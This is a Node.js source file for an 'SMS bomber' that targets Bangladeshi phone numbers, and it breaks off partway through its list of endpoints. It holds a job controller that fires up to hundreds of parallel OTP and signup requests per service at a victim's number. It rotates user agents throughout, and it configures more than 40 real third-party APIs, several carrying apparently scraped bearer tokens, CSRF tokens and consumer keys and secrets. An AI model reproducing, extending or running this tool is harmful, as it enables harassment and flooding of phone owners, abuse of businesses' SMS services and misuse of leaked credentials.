// ============================================================
// ULTIMATE SMS BOMBER V8.0 - FULL PRODUCTION CODE
// All 46+ APIs integrated (api1-api48 + V7.1 + V7.2)
// DEVELOPER: TNEH GROUP
// ============================================================

const express = require('express');
const axios = require('axios');
const cors = require('cors');
const helmet = require('helmet');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const os = require('os');
const EventEmitter = require('events');

// ============================================================
// CONFIG
// ============================================================
const CONFIG = {
  server: { port: process.env.PORT || 3000, host: '0.0.0.0' },
  performance: {
    parallelRequests: 30,
    timeout: 10000,
    maxRetries: 2,
    retryDelay: 100,
    maxCountPerAPI: 500
  },
  security: { rateLimit: { enabled: true, windowMs: 60000, maxRequests: 500 } },
  analytics: { enabled: true, interval: 60000 }
};

const DEVELOPER_INFO = {
  developer: "TNEH GROUP",
  telegram: "@tneh_owner",
  api_version: "8.0.0-FULL",
  build_date: new Date().toISOString()
};

const ERROR_MESSAGES = {
  MISSING_PARAM: 'Missing required parameter',
  INVALID_PHONE: 'Invalid phone number format',
  INVALID_API_KEY: 'Invalid or expired API key',
  RATE_LIMIT: 'Rate limit exceeded',
  JOB_NOT_FOUND: 'Job not found',
  INTERNAL_ERROR: 'Internal server error'
};

// ============================================================
// UTILITY
// ============================================================
class Utility {
  static generateId() { return crypto.randomBytes(16).toString('hex'); }
  static generateJobId() {
    return `JOB_${Date.now().toString(36).toUpperCase()}_${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
  }
  static generateApiKey() {
    const r = crypto.randomBytes(24).toString('hex').toUpperCase();
    const t = Date.now().toString(36).toUpperCase();
    return `TNEH_${r}_${t}`;
  }
  static getCurrentTime() {
    return new Date().toLocaleTimeString('en-US', { hour12: true });
  }
  static getISOString() { return new Date().toISOString(); }
  static sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
  static maskPhone(p) {
    if (!p || p.length < 7) return '***';
    return p.slice(0, 3) + '****' + p.slice(-3);
  }
  static parsePhone(p) { return String(p).replace(/[^0-9]/g, ''); }
  static isValidPhone(p) {
    const c = this.parsePhone(p);
    return /^(01|8801)[0-9]{9}$/.test(c);
  }
  static getRandomElement(a) { return a[Math.floor(Math.random() * a.length)]; }
  static shuffleArray(a) {
    const s = [...a];
    for (let i = s.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [s[i], s[j]] = [s[j], s[i]];
    }
    return s;
  }
  static randomString(len = 8) {
    const c = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let out = '';
    for (let i = 0; i < len; i++) out += c[Math.floor(Math.random() * c.length)];
    return out;
  }
  static randomName() {
    const names = ['Arif','Hasib','Kamrul','Sohag','Raihan','Farhan','Zahid','Imran','Sajib','Munna','Rakib','Noyon','Tusar','Shakib','Naim'];
    return this.getRandomElement(names);
  }
  static formatBytes(b) {
    if (b === 0) return '0 B';
    const k = 1024, sizes = ['B','KB','MB','GB'];
    const i = Math.floor(Math.log(b) / Math.log(k));
    return (b / Math.pow(k, i)).toFixed(2) + ' ' + sizes[i];
  }
  static getMemoryUsage() {
    const u = process.memoryUsage();
    return { rss: this.formatBytes(u.rss), heapUsed: this.formatBytes(u.heapUsed) };
  }
  static normalizeBD(phone) {
    const raw = String(phone).replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (raw.startsWith('880')) return raw;
    if (raw.startsWith('0')) return '880' + raw.slice(1);
    return '880' + raw;
  }
  static normalizePlus88(phone) {
    return '+' + this.normalizeBD(phone);
  }
}

// ============================================================
// USER AGENTS
// ============================================================
const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/143.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
  'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Safari/605.1.15'
];

function getRandomHeaders(extra = {}) {
  return {
    'User-Agent': Utility.getRandomElement(USER_AGENTS),
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.9,bn;q=0.8',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Cache-Control': 'no-cache',
    ...extra
  };
}

// ============================================================
// API STATS TRACKER
// ============================================================
class ApiStatsTracker {
  constructor() { this.stats = new Map(); }
  record(apiId, apiName, success, responseTime, error = null) {
    if (!this.stats.has(apiId)) {
      this.stats.set(apiId, {
        id: apiId, name: apiName, calls: 0, success: 0, failed: 0,
        lastCall: null, lastError: null, avgResponseTime: 0, totalResponseTime: 0
      });
    }
    const s = this.stats.get(apiId);
    s.calls++; s.lastCall = Date.now();
    s.totalResponseTime += responseTime || 0;
    s.avgResponseTime = Math.round(s.totalResponseTime / s.calls);
    if (success) s.success++;
    else { s.failed++; if (error) s.lastError = String(error).slice(0, 200); }
  }
  getAll() { return Array.from(this.stats.values()).sort((a, b) => b.calls - a.calls); }
  getSummary() {
    const arr = this.getAll();
    return {
      total_apis_called: arr.length,
      total_calls: arr.reduce((s, a) => s + a.calls, 0),
      total_success: arr.reduce((s, a) => s + a.success, 0),
      total_failed: arr.reduce((s, a) => s + a.failed, 0)
    };
  }
  reset() { this.stats.clear(); }
}
const apiStatsTracker = new ApiStatsTracker();

// ============================================================
// BOMB CONTROLLER
// ============================================================
class BombController extends EventEmitter {
  constructor() {
    super();
    this.activeJobs = new Map();
    this.pausedJobs = new Map();
    this.completedJobs = new Map();
    this.globalPause = false;
    this.globalStop = false;
    this.stats = {
      totalJobs: 0, totalSMS: 0, totalSuccess: 0, totalFailed: 0,
      startTime: Date.now(), peakActiveJobs: 0
    };
  }
  registerJob(phone, totalCount, options = {}) {
    const jobId = Utility.generateJobId();
    const job = {
      id: jobId, phone, maskedPhone: Utility.maskPhone(phone),
      totalCount, sentCount: 0, successCount: 0, failCount: 0,
      startTime: Date.now(), status: 'active', options,
      progress: 0, errors: [], stopped: false, paused: false
    };
    this.activeJobs.set(jobId, job);
    this.stats.totalJobs++;
    if (this.activeJobs.size > this.stats.peakActiveJobs)
      this.stats.peakActiveJobs = this.activeJobs.size;
    return jobId;
  }
  isJobActive(jobId) {
    if (this.globalStop || this.globalPause) return false;
    const j = this.activeJobs.get(jobId);
    return j && !j.stopped && !j.paused && j.status === 'active';
  }
  stopJob(jobId) {
    const j = this.activeJobs.get(jobId) || this.pausedJobs.get(jobId);
    if (!j) return false;
    j.stopped = true; j.status = 'stopped'; j.endTime = Date.now();
    this.activeJobs.delete(jobId);
    this.pausedJobs.delete(jobId);
    this.completedJobs.set(jobId, j);
    return true;
  }
  stopAllJobs() {
    this.globalStop = true;
    let c = 0;
    [...this.activeJobs.keys(), ...this.pausedJobs.keys()].forEach(id => {
      if (this.stopJob(id)) c++;
    });
    return c;
  }
  pauseJob(jobId) {
    const j = this.activeJobs.get(jobId);
    if (!j) return false;
    j.paused = true; j.status = 'paused';
    this.activeJobs.delete(jobId);
    this.pausedJobs.set(jobId, j);
    return true;
  }
  pauseAllJobs() {
    this.globalPause = true;
    let c = 0;
    [...this.activeJobs.keys()].forEach(id => { if (this.pauseJob(id)) c++; });
    return c;
  }
  resumeJob(jobId) {
    const j = this.pausedJobs.get(jobId);
    if (!j || j.stopped) return false;
    j.paused = false; j.status = 'active';
    this.pausedJobs.delete(jobId);
    this.activeJobs.set(jobId, j);
    return true;
  }
  resumeAllJobs() {
    this.globalPause = false; this.globalStop = false;
    let c = 0;
    [...this.pausedJobs.keys()].forEach(id => { if (this.resumeJob(id)) c++; });
    return c;
  }
  updateJobStats(jobId, success, error = null) {
    const j = this.activeJobs.get(jobId);
    if (!j || j.stopped || j.paused) return;
    j.sentCount++;
    if (success) { j.successCount++; this.stats.totalSuccess++; }
    else {
      j.failCount++; this.stats.totalFailed++;
      if (error) j.errors.push({ t: Date.now(), e: String(error).slice(0, 200) });
      if (j.errors.length > 50) j.errors.shift();
    }
    j.progress = ((j.sentCount / j.totalCount) * 100).toFixed(2);
    this.stats.totalSMS++;
    if (j.sentCount >= j.totalCount) {
      j.status = 'completed'; j.endTime = Date.now();
      this.activeJobs.delete(jobId);
      this.completedJobs.set(jobId, j);
    }
  }
  getJobStatus(jobId) {
    const j = this.activeJobs.get(jobId) || this.pausedJobs.get(jobId) || this.completedJobs.get(jobId);
    if (!j) return null;
    return {
      id: j.id, phone: j.maskedPhone, total: j.totalCount, sent: j.sentCount,
      success: j.successCount, fail: j.failCount, progress: j.progress + '%',
      status: j.status, startTime: j.startTime, endTime: j.endTime || null,
      stopped: j.stopped, paused: j.paused, errors: j.errors.slice(-5)
    };
  }
  getAllJobs() {
    const out = [];
    this.activeJobs.forEach(j => out.push(this.getJobStatus(j.id)));
    this.pausedJobs.forEach(j => out.push(this.getJobStatus(j.id)));
    this.completedJobs.forEach(j => out.push(this.getJobStatus(j.id)));
    return out;
  }
  getStats() {
    const total = this.stats.totalSuccess + this.stats.totalFailed;
    return {
      totalJobs: this.stats.totalJobs, totalSMS: this.stats.totalSMS,
      totalSuccess: this.stats.totalSuccess, totalFailed: this.stats.totalFailed,
      successRate: total > 0 ? ((this.stats.totalSuccess / total) * 100).toFixed(2) + '%' : '0%',
      activeJobs: this.activeJobs.size, pausedJobs: this.pausedJobs.size,
      completedJobs: this.completedJobs.size, peakActiveJobs: this.stats.peakActiveJobs,
      uptime: ((Date.now() - this.stats.startTime) / 1000).toFixed(2) + 's',
      memory: Utility.getMemoryUsage()
    };
  }
  clearCompleted() { const c = this.completedJobs.size; this.completedJobs.clear(); return c; }
}

// ============================================================
// PART 6: ALL APIs — V8.0 INTEGRATION
// ============================================================

// ---- NEW: PHP API1-48 CONVERTED (YOUR LATEST ADDITIONS) ----
const PHP_CONVERTED_APIS = [
  // --- API 1: RedX User Signup ---
  {
    id: 500, name: "PHP-1 RedX Signup", method: "POST",
    url: "https://api.redx.com.bd/v1/user/signup",
    body: { name: "{phone}", service: "redx", phoneNumber: "{phone}" },
    headers: { "Content-Type": "application/json" },
    insecure: true
  },
  // --- API 2: KhaasFood (WordPress 2-step) ---
  {
    id: 501, name: "PHP-2 KhaasFood Step1", method: "POST",
    url: "https://www.khaasfood.com/wp-admin/admin-ajax.php",
    isFormData: true,
    body: {
      mobileNo: "+880{phone_e164}",
      countrycode: "+880",
      csrf: "9d9d08e6e5",
      login: "1", json: "1",
      action: "digits_check_mob"
    },
    headers: {
      "Accept": "application/json, text/javascript, */*; q=0.01",
      "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
      "Origin": "https://www.khaasfood.com",
      "Referer": "https://www.khaasfood.com/",
      "X-Requested-With": "XMLHttpRequest"
    }
  },
  {
    id: 502, name: "PHP-2 KhaasFood Step2", method: "POST",
    url: "https://www.khaasfood.com/wp-admin/admin-ajax.php",
    isFormData: true,
    body: {
      mobileNo: "+880{phone_e164}",
      digits_reg_mail: "+880{phone_e164}",
      dig_nounce: "9d9d08e6e5",
      action: "digits_check_mob",
      login: "2",
      countrycode: "+880",
      digregcode: "+880",
      digregcode2: "+880",
      digits: "1", dtype: "2", json: "1",
      csrf: "9d9d08e6e5"
    },
    headers: {
      "Accept": "*/*",
      "Origin": "https://www.khaasfood.com",
      "Referer": "https://www.khaasfood.com/",
      "X-Requested-With": "XMLHttpRequest"
    }
  },
  // --- API 3: Bioscope Live ---
  {
    id: 503, name: "PHP-3 Bioscope Live", method: "POST",
    url: "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en",
    body: { number: "+88{phone}" },
    headers: {
      "accept": "application/json",
      "content-type": "application/json",
      "origin": "https://www.bioscopeplus.com",
      "referer": "https://www.bioscopeplus.com/"
    }
  },
  // --- API 4: Bikroy (already in original, but keep separate copy) ---
  {
    id: 504, name: "PHP-4 Bikroy Login", method: "GET",
    url: "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}",
    headers: { "application-name": "web", "referer": "https://bikroy.com/" }
  },
  // --- API 5: Proiojon Signup ---
  {
    id: 505, name: "PHP-5 Proiojon Signup", method: "POST",
    url: "https://billing.proiojon.com/api/v1/auth/sign-up",
    body: {
      name: "randomName", email: "randomEmail",
      phone: "{phone}", password: "password123", ref_code: ""
    },
    dynamicFields: true,
    headers: {
      "accept": "*/*",
      "content-type": "application/json; charset=UTF-8",
      "authorization": "Bearer null",
      "origin": "https://proiojon.com",
      "referer": "https://proiojon.com/",
      "x-localization": "en",
      "zoneid": "[2]"
    }
  },
  // --- API 6: Beauty Booth ---
  {
    id: 506, name: "PHP-6 BeautyBooth", method: "POST",
    url: "https://admin.beautybooth.com.bd/api/v2/auth/signup",
    body: { phone: "{phone}" },
    headers: {
      "User-Agent": "Dart/2.19 (dart:io)",
      "Accept": "application/json",
      "Content-Type": "application/json; charset=utf-8"
    }
  },
  // --- API 7: Medha ---
  {
    id: 507, name: "PHP-7 Medha OTP", method: "POST",
    url: "https://developer.medha.info/api/send-otp",
    body: { phone: "880{phone_10}", is_register: "1" },
    headers: {
      "User-Agent": "Dart/3.2 (dart:io)",
      "Content-Type": "application/json; charset=utf-8",
      "authorization": "Bearer"
    }
  },
  // --- API 8: DeeptoPlay login (already present, keep copy) ---
  {
    id: 508, name: "PHP-8 DeeptoPlay Login", method: "POST",
    url: "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en",
    body: { number: "+88{phone}" },
    headers: {
      "accept": "application/json",
      "content-type": "application/json",
      "origin": "https://www.deeptoplay.com",
      "referer": "https://www.deeptoplay.com/"
    },
    insecure: true
  },
  // --- API 9: Robi Web ---
  {
    id: 509, name: "PHP-9 Robi Web OTP", method: "POST",
    url: "https://webapi.robi.com.bd/v1/send-otp",
    body: { phone_number: "{phone}", type: "doorstep" },
    headers: {
      "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY5MjY0MjcyOCwibmJmIjoxNjkyNjQyNzI4LCJleHAiOjE2OTI2NDYzMjgsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.5xbPa1JiodXeIST6v9c0f_4thF6tTBzaLLfuHlN7NSc",
      "Content-Type": "application/json"
    },
    insecure: true
  },
  // --- API 10: Arogga (multipart) ---
  {
    id: 510, name: "PHP-10 Arogga", method: "POST",
    url: "https://api.arogga.com/auth/v1/sms/send/?f=web&b=Chrome&v=122.0.0.0&os=Windows&osv=10",
    isFormData: true,
    body: { mobile: "{phone}", fcmToken: "", referral: "" },
    headers: {
      "accept": "*/*",
      "content-type": "application/x-www-form-urlencoded",
      "origin": "https://www.arogga.com",
      "referer": "https://www.arogga.com/"
    }
  },
  // --- API 11: MyGP Cinematic (send-common-otp) ---
  {
    id: 511, name: "PHP-11 Cinematic GP", method: "POST",
    url: "https://api.mygp.cinematic.mobi/api/v1/send-common-otp/wap/{phone}",
    body: {
      headers: {
        "Content-Type": "application/json",
        "Access-Control-Allow-Origin": "*",
        "Authorization": "Bearer 1pake4mh5ln64h5t26kpvm3iri"
      }
    },
    headers: {
      "accept": "application/json, text/plain, */*",
      "content-type": "application/json;charset=UTF-8",
      "origin": "https://cinematic.mobi",
      "referer": "https://cinematic.mobi/"
    }
  },
  // --- API 12: BDStall ---
  {
    id: 512, name: "PHP-12 BDStall", method: "POST",
    url: "https://www.bdstall.com/userRegistration/save_otp_info/",
    isFormData: true,
    body: { UserTypeID: "2", RequestType: "1", Name: "Md", Mobile: "{phone}" }
  },
  // --- API 13: BCS Examaid ---
  {
    id: 513, name: "PHP-13 BCS Examaid", method: "POST",
    url: "https://bcsexamaid.com/api/generateotp",
    body: { mobile: "{phone}", softtoken: "Rifat.Admin.2022" },
    headers: {
      "User-Agent": "Dart/3.1 (dart:io)",
      "Accept": "application/json",
      "Content-Type": "application/json; charset=utf-8"
    }
  },
  // --- API 14: Doctor Live BD ---
  {
    id: 514, name: "PHP-14 DoctorLiveBD", method: "POST",
    url: "https://doctorlivebd.com/api/patient/auth/otpsend",
    isFormData: true,
    body: { country_code: "880", mobile: "{phone_10}" },
    headers: {
      "User-Agent": "okhttp/4.10.0",
      "Content-Type": "application/x-www-form-urlencoded"
    }
  },
  // --- API 15: Sheba XYZ (2-step) ---
  {
    id: 515, name: "PHP-15 Sheba GenerateToken", method: "GET",
    url: "https://accounts.sheba.xyz/api/v1/accountkit/generate/token?app_id=8329815A6D1AE6DD",
    dynamicToken: true
  },
  {
    id: 516, name: "PHP-15 Sheba ShootOTP", method: "POST",
    url: "https://accountkit.sheba.xyz/api/shoot-otp",
    body: { mobile: "+88{phone}", app_id: "8329815A6D1AE6DD", api_token: "{token}" },
    requiresToken: true,
    headers: { "Content-Type": "application/json" }
  },
  // --- API 16: Apex4u ---
  {
    id: 517, name: "PHP-16 Apex4u", method: "POST",
    url: "https://api.apex4u.com/api/auth/login",
    body: { phoneNumber: "{phone}" },
    headers: {
      "accept": "application/json, text/plain, */*",
      "content-type": "application/json",
      "origin": "https://apex4u.com",
      "referer": "https://apex4u.com/"
    }
  },
  // --- API 17: Sindabad ---
  {
    id: 518, name: "PHP-17 Sindabad", method: "POST",
    url: "https://offers.sindabad.com/api/mobile-otp",
    body: { key: "c94e67fb2a59af3b6fa21f24463b2061", mobile: "+88{phone}" },
    headers: {
      "accept": "application/json, text/plain, */*",
      "Content-Type": "application/json",
      "Origin": "https://sindabad.com",
      "Referer": "https://sindabad.com/"
    }
  },
  // --- API 18: Kirei BD ---
  {
    id: 519, name: "PHP-18 KireiBD", method: "POST",
    url: "https://app.kireibd.com/api/v2/send-login-otp",
    body: { email: "{phone}" },
    headers: {
      "Content-Type": "application/json",
      "x-xsrf-token": "eyJpdiI6Imh2dU9zVk9rQUR5TjlsQVBvd2F2cUE9PSIsInZhbHVlIjoiQlZUdXlHcmpES2FGUXBja1dZbUZXZG9MVksreEwxa1ZzZGgzYml3MHIxMmlraURSTjVLUnpPY0ZEeEJmSldqNGNaOG5rc0FNYkVDMlJqakJmZGVlckdvNVFobnBzTFpOSnpsbVZENlVvUW5JSHhvMkYxd1VKcG9Zc0tmTUlEdUQiLCJtYWMiOiJiZjIwNmQ0OWNlZTFiYWMyZWQ4YWRmMTEzYjAwNWFkOTNmOTgzMzRiODJlZWMxOWM0MTFhOGNkODhjNzQzZWQxIiwidGFnIjoiIn0="
    },
    insecure: true
  },
  // --- API 19: Shikho V2 ---
  {
    id: 520, name: "PHP-19 Shikho v2", method: "POST",
    url: "https://api.shikho.com/auth/v2/send/sms",
    body: { phone: "{phone}", type: "student", auth_type: "signup", vendor: "shikho" },
    headers: {
      "Accept": "application/json, text/plain, */*",
      "Content-Type": "application/json",
      "Origin": "https://app.shikho.com",
      "Referer": "https://app.shikho.com/"
    }
  },
  // --- API 20: Circle Reseller ---
  {
    id: 521, name: "PHP-20 Circle Reseller", method: "POST",
    url: "https://reseller.circle.com.bd/api/v2/auth/signup",
    body: {
      name: "+88{phone}", email_or_phone: "+88{phone}",
      password: "123456", password_confirmation: "123456", register_by: "phone"
    },
    headers: { "Content-Type": "application/json" },
    insecure: true
  },
  // --- API 21: BDTickets Auth ---
  {
    id: 522, name: "PHP-21 BDTickets Auth", method: "POST",
    url: "https://api.bdtickets.com:20100/v1/auth",
    body: { createUserCheck: true, phoneNumber: "+88{phone}", applicationChannel: "WEB_APP" },
    headers: {
      "accept": "application/json, text/plain, */*",
      "content-type": "application/json",
      "origin": "https://bdtickets.com",
      "referer": "https://bdtickets.com/"
    }
  },
  // --- API 22: GP BK Shop FWA ---
  {
    id: 523, name: "PHP-22 GP FWA OTP", method: "POST",
    url: "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp",
    body: { phone: "{phone}", email: "", language: "en" },
    headers: { "Content-Type": "application/json" }
  },
  // --- API 23: RFL BestBuy ---
  {
    id: 524, name: "PHP-23 RFL BestBuy", method: "POST",
    url: "https://rflbestbuy.com/api/login/?lang_code=en&currency_code=BDT",
    body: {
      company_id: "26", password2: "Riyaz@123", currency_code: "BDT",
      user_type: "C", email: "{phone}@gmail.com", g_id: "", lang_code: "en",
      operating_system: "Android", otp_verify: false, password1: "Riyaz@123",
      phone: "{phone}", storefront_id: "3"
    },
    headers: {
      "Authorization": "Bearer bWlzNTdAcHJhbmdyb3VwLmNvbTpJWE94N1NVUFYwYUE0Rjg4Nmg4bno5V2I2STUzNTNBQQ==",
      "Content-Type": "application/json"
    }
  },
  // --- API 24: Chorki Mobile ---
  {
    id: 525, name: "PHP-24 Chorki Mobile", method: "POST",
    url: "https://api-dynamic.chorki.com/v1/auth/login?country=BD&platform=mobile",
    body: { number: "{phone}" },
    headers: {
      "User-Agent": "Chorki/2.0.33 (Android 13; GM1917; GM1917; arm64-v8a)",
      "Content-Type": "application/json"
    }
  },
  // --- API 25: HishabExpress ---
  {
    id: 526, name: "PHP-25 HishabExpress", method: "POST",
    url: "https://api.hishabexpress.com/login/status",
    isFormData: true,
    body: { msisdn: "{phone}", hash: "Hello" },
    headers: { "User-Agent": "Dart/2.19 (dart:io)", "Content-Type": "application/x-www-form-urlencoded" },
    insecure: true
  },
  // --- API 26: Mujib Chorcha ---
  {
    id: 527, name: "PHP-26 Chorcha", method: "GET",
    url: "https://mujib.chorcha.net/auth/check?phone={phone}",
    headers: { "x-chorcha-mode": "prod", "x-chorcha-platform": "web" }
  },
  // --- API 27: Wafilife ---
  {
    id: 528, name: "PHP-27 Wafilife", method: "GET",
    url: "https://m-backend.wafilife.com/wp-json/wc/v2/send-otp?p={phone}&consumer_key=ck_e8c5b4a69729dd913dce8be03d7878531f6511ff&consumer_secret=cs_f866e5c6543065daa272504c2eea71044579cff3"
  },
  // --- API 28: Robi Register OTP ---
  {
    id: 529, name: "PHP-28 Robi Register", method: "POST",
    url: "https://webapi.robi.com.bd/v1/account/register/otp",
    body: { phone_number: "{phone}" },
    headers: {
      "X-CSRF-TOKEN": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY4MTQ3MjU5NiwibmJmIjoxNjgxNDcyNTk2LCJleHAiOjE2ODE0NzYxOTYsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.-k1ByaD69rmEy1NXzEIT08fJvZ9c6OysjmaQfe8hEz0",
      "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY4MTQ3MjU5NiwibmJmIjoxNjgxNDcyNTk2LCJleHAiOjE2ODE0NzYxOTYsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.-k1ByaD69rmEy1NXzEIT08fJvZ9c6OysjmaQfe8hEz0",
      "Content-Type": "application/json"
    },
    insecure: true
  },
  // --- API 29: Chardike ---
  {
    id: 530, name: "PHP-29 Chardike", method: "POST",
    url: "https://api.chardike.com/api/otp/send",
    body: { phone: "{phone}", otp_type: "login" },
    headers: {
      "accept": "*/*",
      "content-type": "application/json",
      "origin": "https://chardike.com",
      "referer": "https://chardike.com/"
    }
  },
  // --- API 30: eTestPaper (2-step) ---
  {
    id: 531, name: "PHP-30 eTestPaper Exists", method: "POST",
    url: "https://prod.etestpaper.net/api/exists",
    body: { phone: "{phone}" },
    headers: {
      "content-type": "application/json",
      "origin": "https://www.etestpaper.net",
      "referer": "https://www.etestpaper.net/"
    }
  },
  {
    id: 532, name: "PHP-30 eTestPaper OTP", method: "POST",
    url: "https://prod.etestpaper.net/api/v4/auth/otp",
    body: { phone: "{phone}", recaptcha: "668be73dcad2999a957ff440" },
    headers: {
      "content-type": "application/json",
      "origin": "https://www.etestpaper.net",
      "referer": "https://www.etestpaper.net/"
    }
  },
  // --- API 31: GPay GP Checksignup ---
  {
    id: 533, name: "PHP-31 GPay CheckSignup", method: "POST",
    url: "https://gpayapp.grameenphone.com/prod_mfs/sub/user/checksignup",
    body: { deviceId: "35{phone}30", msisdn: "{phone}", tran_type: "OTPREQSIGNUP" },
    headers: { "Content-Type": "application/json" }
  },
  // --- API 32: AppLink OTP ---
  {
    id: 534, name: "PHP-32 AppLink OTP", method: "POST",
    url: "https://apps.applink.com.bd/appstore-v4-server/login/otp/request",
    body: { msisdn: "88{phone}" },
    headers: {
      "content-type": "application/json",
      "origin": "https://applink.com.bd",
      "referer": "https://applink.com.bd/"
    },
    insecure: true
  },
  // --- API 33: Priyo Shikkhaloy ---
  {
    id: 535, name: "PHP-33 Priyo Shikkhaloy", method: "POST",
    url: "https://app.priyoshikkhaloy.com/api/user/register-login.php",
    isFormData: true,
    body: { mobile: "{phone}" },
    headers: { "User-Agent": "okhttp/4.11.0", "Content-Type": "application/x-www-form-urlencoded" },
    insecure: true
  },
  // --- API 34: Kabbik ---
  {
    id: 536, name: "PHP-34 Kabbik OTP", method: "POST",
    url: "https://api.kabbik.com/v1/auth/otpnew",
    body: { msisdn: "88{phone}", currentTimeLong: "currentTime", passKey: "qOQNBtVmoTTPVmfn" },
    dynamicFields: true,
    headers: {
      "content-type": "application/json",
      "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMjgyMCIsInJvbGUiOjEsImlhdCI6MTY2NTc0NjIyNX0.dSY47sipaGTI_OtsysFWw_kaKZKWHWRtp4vklstVgVc",
      "origin": "https://kabbik.com",
      "referer": "https://kabbik.com/"
    },
    insecure: true
  },
  // --- API 35: Salextra ---
  {
    id: 537, name: "PHP-35 Salextra", method: "POST",
    url: "https://salextra.com.bd/customer/checkusernameavailabilityonregistration",
    isFormData: true,
    body: {
      username: "{phone}",
      loginType: "MOBILE",
      __RequestVerificationToken: "CfDJ8LiTcoRywYZJiSdmMqGF8TUqJw9C6KMdGm1h66OVTdHacNf0PM5Ejsmu_DNPddqz7Sk-XUyXwxIyHALKpZ5bn1jwr9l-9IzOmASY_Z3cKb2mndEZn3KyLqq80U8QyitKCPtmt1zxxiMWd_970_jfTmg"
    },
    headers: {
      "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
      "origin": "https://salextra.com.bd",
      "referer": "https://salextra.com.bd/register?returnUrl=%2F",
      "x-requested-with": "XMLHttpRequest"
    }
  },
  // --- API 36: Sundora Customer ---
  {
    id: 538, name: "PHP-36 Sundora Customer", method: "POST",
    url: "https://api.sundora.com.bd/api/user/customer/",
    body: {
      customer: {
        email: "kgjkgjgg{phone}@gmail.com",
        password: "#bUV?'3*N#7N}.g",
        password_confirmation: "#bUV?'3*N#7N}.g",
        phone: "+880{phone_10}",
        draft_order_id: null,
        first_name: "sdfgfd", last_name: "fgfd",
        note: { birthday: "", gender: "male" },
        withTimeout: true, newsletter_email: true, newsletter_sms: true
      }
    },
    headers: {
      "content-type": "application/json",
      "My-Location": "BD",
      "origin": "https://sundora.com.bd",
      "referer": "https://sundora.com.bd/"
    }
  },
  // --- API 37: Cinematic SBENT ---
  {
    id: 539, name: "PHP-37 Cinematic SBENT", method: "POST",
    url: "https://api.mygp.cinematic.mobi/api/v1/otp/88{phone}/SBENT_3GB7D",
    body: {
      accessinfo: {
        access_token: "K165S6V6q4C6G7H0y9C4f5W7t5YeC6",
        referenceCode: "20190827042622"
      }
    },
    headers: { "Content-Type": "application/json" },
    insecure: true
  },
  // --- API 38: BajiStar ---
  {
    id: 540, name: "PHP-38 BajiStar OTP", method: "GET",
    url: "https://bajistar.com:1443/public/api/v1/getOtp?recipient=88{phone}",
    headers: {
      "Origin": "https://www.playbajistar.com",
      "Referer": "https://www.playbajistar.com/"
    }
  },
  // --- API 39: DocTime ---
  {
    id: 541, name: "PHP-39 DocTime", method: "POST",
    url: "https://api.doctime.com.bd/api/authenticate",
    body: { contact_no: "{phone}", country_calling_code: "88" },
    headers: {
      "User-Agent": "okhttp/4.12.0",
      "Content-Type": "application/json",
      "app-version": "0.29.11",
      "device-brand": "Genymobile",
      "platform": "Android",
      "device-model": "Galaxy S4",
      "os-version": "11",
      "locale": "bn"
    },
    insecure: true
  },
  // --- API 40: Weblogin DA GP ---
  {
    id: 542, name: "PHP-40 WebloginDA GP", method: "POST",
    url: "https://webloginda.grameenphone.com/backend/api/v1/otp",
    isFormData: true,
    body: { msisdn: "{phone}" },
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
      "Origin": "https://gpfi.grameenphone.com",
      "Referer": "https://gpfi.grameenphone.com/"
    }
  },
  // --- API 41: Meenabazar ---
  {
    id: 543, name: "PHP-41 Meenabazar OTP", method: "POST",
    url: "https://meenabazardev.com/api/mobile/front/send/otp?CellPhone={phone}&type=login",
    headers: {
      "User-Agent": "Dart/3.2 (dart:io)",
      "content-type": "application/json"
    }
  },
  // --- API 42: MedEasy ---
  {
    id: 544, name: "PHP-42 MedEasy OTP", method: "GET",
    url: "https://api.medeasy.health/api/send-otp/+88{phone}/",
    headers: {
      "accept": "application/json",
      "origin": "https://medeasy.health",
      "referer": "https://medeasy.health/"
    }
  },
  // --- API 43: Iqra Live ---
  {
    id: 545, name: "PHP-43 Iqra Live", method: "GET",
